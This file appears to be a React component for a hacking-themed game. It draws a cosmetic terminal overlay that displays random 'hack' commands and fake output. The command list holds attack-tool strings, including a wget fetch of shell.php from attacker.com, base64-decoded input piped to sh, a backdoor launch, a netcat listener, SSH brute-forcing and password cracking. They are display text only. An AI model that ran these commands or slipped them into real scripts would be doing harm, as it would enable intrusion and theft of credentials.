import React from 'react'

interface NeonCyberHackOverlaysProps {
  hackingPhase: boolean
  currentServer: number
  accessGranted: boolean
  win: boolean
  choice: 'stealth' | 'brute' | 'elite'
  hackingProgress: number
}

const HACK_COMMANDS = [
  'nmap -sS -O target_server',
  'sudo hydra -l admin -P wordlist.txt ssh://target',
  'msfconsole -x "use exploit/multi/handler"',
  'sqlmap -u "http://target/login" --dbs',
  'nikto -h http://target_server',
  'john --wordlist=rockyou.txt shadow.txt',
  'nc -lvp 4444',
  'python exploit.py --target=192.168.1.100',
  'curl -X POST -d "payload" http://target/api',
  'ssh-keygen -t rsa -b 4096',
  'openssl s_client -connect target:443',
  'tcpdump -i eth0 host target_server',
  'python -c "import socket,subprocess,os"',
  'echo "payload" | base64 -d | sh',
  'wget http://attacker.com/shell.php',
  'chmod +x backdoor && ./backdoor',
  'ps aux | grep -i suspicious',
  'netstat -tulpn | grep LISTEN',
  'find / -perm -4000 2>/dev/null',
  'cat /etc/passwd | grep -v nologin',
]

export default function NeonCyberHackOverlays({
  hackingPhase,
  currentServer,
  accessGranted,
  win,
  choice,
  hackingProgress
}: NeonCyberHackOverlaysProps) {
  const [terminalLines, setTerminalLines] = React.useState<string[]>([])
  const [currentCommand, setCurrentCommand] = React.useState('')
  
  React.useEffect(() => {
    if (hackingPhase && currentServer > 0) {
      setTerminalLines([])
      setCurrentCommand('')
      
      const interval = setInterval(() => {
        const randomCommand = HACK_COMMANDS[Math.floor(Math.random() * HACK_COMMANDS.length)]
        setCurrentCommand(randomCommand)
        
        setTimeout(() => {
          setTerminalLines(prev => {
            const newLines = [...prev, `$ ${randomCommand}`, getRandomOutput()]
            return newLines.slice(-8) // Keep only last 8 lines
          })
          setCurrentCommand('')
        }, 800)
      }, 1200)
      
      return () => clearInterval(interval)
    }
  }, [hackingPhase, currentServer])
  
  const getRandomOutput = () => {
    const outputs = [
      'Connection established...',
      'Scanning ports: 22, 80, 443, 8080',
      'Vulnerability found: CVE-2023-1337',
      'Injecting payload...',
      'Escalating privileges...',
      'Accessing encrypted files...',
      'Bypassing authentication...',
      'Shell spawned on port 4444',
      'Root access obtained',
      'Extracting sensitive data...',
      'Covering tracks...',
      'Connection terminated',
    ]
    return outputs[Math.floor(Math.random() * outputs.length)]
  }
  
  if (hackingPhase && currentServer > 0) {
    return (
      <div style={{
        position: 'absolute',
        top: '20px',
        left: '20px',
        width: '350px',
        height: '280px',
        background: 'rgba(0, 0, 0, 0.95)',
        border: '2px solid #22c55e',
        borderRadius: '8px',
        padding: '16px',
        color: '#22c55e',
        fontSize: '11px',
        fontFamily: 'monospace',
        zIndex: 1000,
        boxShadow: '0 0 30px rgba(34, 197, 94, 0.4)',
        backdropFilter: 'blur(10px)',
        overflow: 'hidden'
      }}>
        {/* Terminal header */}
        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          marginBottom: '12px',
          paddingBottom: '8px',
          borderBottom: '1px solid rgba(34, 197, 94, 0.3)'
        }}>
          <div style={{ fontSize: '12px', fontWeight: 700 }}>
            ◉ HACK_TERMINAL_v2.1
          </div>
          <div style={{ fontSize: '10px', opacity: 0.7 }}>
            SRV_{currentServer.toString().padStart(2, '0')}
          </div>
        </div>
        
        {/* Current operation status */}
        <div style={{ marginBottom: '12px', fontSize: '10px' }}>
          <div style={{ color: '#fbbf24', marginBottom: '4px' }}>
            &gt; INFILTRATING_SERVER_{currentServer.toString().padStart(2, '0')}
          </div>
          <div style={{ marginBottom: '4px' }}>
            &gt; METHOD: {choice.toUpperCase()}
          </div>
          <div style={{ marginBottom: '8px' }}>
            &gt; PROGRESS: {hackingProgress}%
          </div>
          
          {/* Mini progress bar */}
          <div style={{
            width: '100%',
            height: '6px',
            background: 'rgba(34, 197, 94, 0.2)',
            border: '1px solid rgba(34, 197, 94, 0.5)',
            borderRadius: '3px',
            marginBottom: '12px',
            overflow: 'hidden'
          }}>
            <div style={{
              width: `${hackingProgress}%`,
              height: '100%',
              background: 'linear-gradient(90deg, #22c55e, #06b6d4)',
              borderRadius: '2px',
              transition: 'width 0.15s ease',
              boxShadow: '0 0 4px #22c55e'
            }} />
          </div>
        </div>
        
        {/* Scrolling terminal output */}
        <div style={{
          flex: 1,
          overflow: 'hidden',
          marginBottom: '12px'
        }}>
          {terminalLines.map((line, index) => (
            <div
              key={index}
              style={{
                marginBottom: '2px',
                opacity: line.startsWith('$') ? 1 : 0.8,
                color: line.startsWith('$') ? '#22c55e' : '#06b6d4',
                fontSize: '10px',
                animation: 'terminalLine 0.3s ease-in'
              }}
            >
              {line}
            </div>
          ))}
          
          {/* Current typing command */}
          {currentCommand && (
            <div style={{
              color: '#22c55e',
              fontSize: '10px',
              display: 'flex',
              alignItems: 'center'
            }}>
              $ {currentCommand}
              <span style={{
                marginLeft: '2px',
                animation: 'blink 1s infinite'
              }}>_</span>
            </div>
          )}
        </div>
        
        {/* Status indicators */}
        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          fontSize: '9px',
          opacity: 0.7,
          borderTop: '1px solid rgba(34, 197, 94, 0.2)',
          paddingTop: '8px'
        }}>
          <div>
            {choice === 'stealth' ? '🥷 STEALTH_MODE' :
             choice === 'brute' ? '💥 BRUTE_FORCE' :
             '🎯 ELITE_HACK'}
          </div>
          <div style={{ color: '#fbbf24' }}>
            ● ACTIVE
          </div>
        </div>
        
        <style>
          {`
            @keyframes blink {
              0%, 50% { opacity: 1; }
              51%, 100% { opacity: 0; }
            }
            @keyframes terminalLine {
              from { opacity: 0; transform: translateX(-10px); }
              to { opacity: 1; transform: translateX(0); }
            }
          `}
        </style>
      </div>
    )
  }

  if (accessGranted && win) {
    return (
      <div style={{
        position: 'absolute',
        top: '20px',
        right: '20px',
        width: '280px',
        background: 'rgba(34, 197, 94, 0.15)',
        border: '2px solid #22c55e',
        borderRadius: '12px',
        padding: '20px',
        color: '#22c55e',
        fontSize: '12px',
        fontFamily: 'monospace',
        zIndex: 1000,
        boxShadow: '0 0 40px rgba(34, 197, 94, 0.6)',
        backdropFilter: 'blur(15px)',
        animation: 'accessSuccess 2s ease-in-out'
      }}>
        <div style={{
          textAlign: 'center',
          marginBottom: '16px'
        }}>
          <div style={{
            fontSize: '32px',
            marginBottom: '8px',
            filter: 'drop-shadow(0 0 15px rgba(34, 197, 94, 0.8))'
          }}>
            🔓
          </div>
          <div style={{
            fontSize: '14px',
            fontWeight: 700,
            textShadow: '0 2px 10px rgba(34, 197, 94, 0.8)'
          }}>
            ACCESS_GRANTED
          </div>
        </div>
        
        <div style={{ fontSize: '10px', opacity: 0.9 }}>
          <div>&gt; ROOT_PRIVILEGES_OBTAINED</div>
          <div>&gt; DATA_EXTRACTION_COMPLETE</div>
          <div>&gt; COVERING_DIGITAL_TRACKS</div>
          <div>&gt; MISSION_ACCOMPLISHED</div>
        </div>
        
        {/* Success indicator */}
        <div style={{
          marginTop: '12px',
          padding: '8px',
          background: 'rgba(34, 197, 94, 0.1)',
          borderRadius: '6px',
          border: '1px solid rgba(34, 197, 94, 0.3)',
          textAlign: 'center',
          fontSize: '10px',
          fontWeight: 700
        }}>
          ✅ BREACH_SUCCESSFUL
        </div>
        
        <style>
          {`
            @keyframes accessSuccess {
              0% { opacity: 0; transform: translateY(-20px) scale(0.9); }
              100% { opacity: 1; transform: translateY(0) scale(1); }
            }
          `}
        </style>
      </div>
    )
  }

  // Show infiltration status in top right during hacking
  if (hackingPhase && currentServer > 0) {
    return (
      <>
        {/* Main terminal CLI - top left */}
        <div style={{
          position: 'absolute',
          top: '20px',
          left: '20px',
          width: '350px',
          height: '280px',
          background: 'rgba(0, 0, 0, 0.95)',
          border: '2px solid #22c55e',
          borderRadius: '8px',
          padding: '16px',
          color: '#22c55e',
          fontSize: '11px',
          fontFamily: 'monospace',
          zIndex: 1000,
          boxShadow: '0 0 30px rgba(34, 197, 94, 0.4)',
          backdropFilter: 'blur(10px)',
          overflow: 'hidden'
        }}>
          {/* Terminal header */}
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
            marginBottom: '12px',
            paddingBottom: '8px',
            borderBottom: '1px solid rgba(34, 197, 94, 0.3)'
          }}>
            <div style={{ fontSize: '12px', fontWeight: 700 }}>
              ◉ HACK_TERMINAL_v2.1
            </div>
            <div style={{ fontSize: '10px', opacity: 0.7 }}>
              SRV_{currentServer.toString().padStart(2, '0')}
            </div>
          </div>
          
          {/* Current operation status */}
          <div style={{ marginBottom: '12px', fontSize: '10px' }}>
            <div style={{ color: '#fbbf24', marginBottom: '4px' }}>
              &gt; INFILTRATING_SERVER_{currentServer.toString().padStart(2, '0')}
            </div>
            <div style={{ marginBottom: '4px' }}>
              &gt; METHOD: {choice.toUpperCase()}
            </div>
            <div style={{ marginBottom: '8px' }}>
              &gt; PROGRESS: {hackingProgress}%
            </div>
            
            {/* Mini progress bar */}
            <div style={{
              width: '100%',
              height: '6px',
              background: 'rgba(34, 197, 94, 0.2)',
              border: '1px solid rgba(34, 197, 94, 0.5)',
              borderRadius: '3px',
              marginBottom: '12px',
              overflow: 'hidden'
            }}>
              <div style={{
                width: `${hackingProgress}%`,
                height: '100%',
                background: 'linear-gradient(90deg, #22c55e, #06b6d4)',
                borderRadius: '2px',
                transition: 'width 0.15s ease',
                boxShadow: '0 0 4px #22c55e'
              }} />
            </div>
          </div>
          
          {/* Scrolling terminal output */}
          <div style={{
            flex: 1,
            overflow: 'hidden',
            marginBottom: '12px'
          }}>
            {terminalLines.map((line, index) => (
              <div
                key={index}
                style={{
                  marginBottom: '2px',
                  opacity: line.startsWith('$') ? 1 : 0.8,
                  color: line.startsWith('$') ? '#22c55e' : '#06b6d4',
                  fontSize: '10px',
                  animation: 'terminalLine 0.3s ease-in'
                }}
              >
                {line}
              </div>
            ))}
            
            {/* Current typing command */}
            {currentCommand && (
              <div style={{
                color: '#22c55e',
                fontSize: '10px',
                display: 'flex',
                alignItems: 'center'
              }}>
                $ {currentCommand}
                <span style={{
                  marginLeft: '2px',
                  animation: 'blink 1s infinite'
                }}>_</span>
              </div>
            )}
          </div>
          
          {/* Status indicators */}
          <div style={{
            display: 'flex',
            justifyContent: 'space-between',
            fontSize: '9px',
            opacity: 0.7,
            borderTop: '1px solid rgba(34, 197, 94, 0.2)',
            paddingTop: '8px'
          }}>
            <div>
              {choice === 'stealth' ? '🥷 STEALTH_MODE' :
               choice === 'brute' ? '💥 BRUTE_FORCE' :
               '🎯 ELITE_HACK'}
            </div>
            <div style={{ color: '#fbbf24' }}>
              ● ACTIVE
            </div>
          </div>
          
          <style>
            {`
              @keyframes blink {
                0%, 50% { opacity: 1; }
                51%, 100% { opacity: 0; }
              }
              @keyframes terminalLine {
                from { opacity: 0; transform: translateX(-10px); }
                to { opacity: 1; transform: translateX(0); }
              }
            `}
          </style>
        </div>

        {/* Infiltration status overlay - top right */}
        <div style={{
          position: 'absolute',
          top: '20px',
          right: '20px',
          width: '220px',
          background: 'rgba(0, 0, 0, 0.9)',
          border: '2px solid #9333ea',
          borderRadius: '8px',
          padding: '16px',
          color: '#9333ea',
          fontSize: '11px',
          fontFamily: 'monospace',
          zIndex: 999,
          boxShadow: '0 0 25px rgba(147, 51, 234, 0.4)',
          backdropFilter: 'blur(10px)'
        }}>
          <div style={{
            fontSize: '12px',
            fontWeight: 700,
            marginBottom: '12px',
            textAlign: 'center',
            color: '#fbbf24'
          }}>
            ⚠️ INFILTRATION_STATUS
          </div>
          
          <div style={{ marginBottom: '12px', fontSize: '10px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
              <span>TARGET:</span>
              <span style={{ color: '#22c55e' }}>SRV_{currentServer.toString().padStart(2, '0')}</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
              <span>METHOD:</span>
              <span style={{ color: '#06b6d4' }}>{choice.toUpperCase()}</span>
            </div>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '8px' }}>
              <span>STATUS:</span>
              <span style={{ color: '#fbbf24' }}>BREACHING</span>
            </div>
          </div>
          
          {/* Security level indicators */}
          <div style={{
            background: 'rgba(147, 51, 234, 0.1)',
            borderRadius: '6px',
            padding: '8px',
            border: '1px solid rgba(147, 51, 234, 0.3)',
            marginBottom: '10px'
          }}>
            <div style={{ fontSize: '9px', marginBottom: '6px', textAlign: 'center' }}>
              SECURITY_ANALYSIS
            </div>
            <div style={{ fontSize: '9px' }}>
              <div>🔒 FIREWALL: ACTIVE</div>
              <div>🛡️ IDS: BYPASSED</div>
              <div>⚡ ENCRYPTION: {hackingProgress > 50 ? 'CRACKED' : 'BREAKING'}</div>
            </div>
          </div>
          
          {/* Risk level */}
          <div style={{
            textAlign: 'center',
            padding: '6px',
            background: choice === 'elite' ? 'rgba(239, 68, 68, 0.2)' : choice === 'brute' ? 'rgba(245, 158, 11, 0.2)' : 'rgba(34, 197, 94, 0.2)',
            borderRadius: '4px',
            fontSize: '9px',
            fontWeight: 700,
            color: choice === 'elite' ? '#ef4444' : choice === 'brute' ? '#f59e0b' : '#22c55e'
          }}>
            RISK: {choice === 'elite' ? 'EXTREME' : choice === 'brute' ? 'HIGH' : 'LOW'}
          </div>
        </div>
      </>
    )
  }

  return null
}
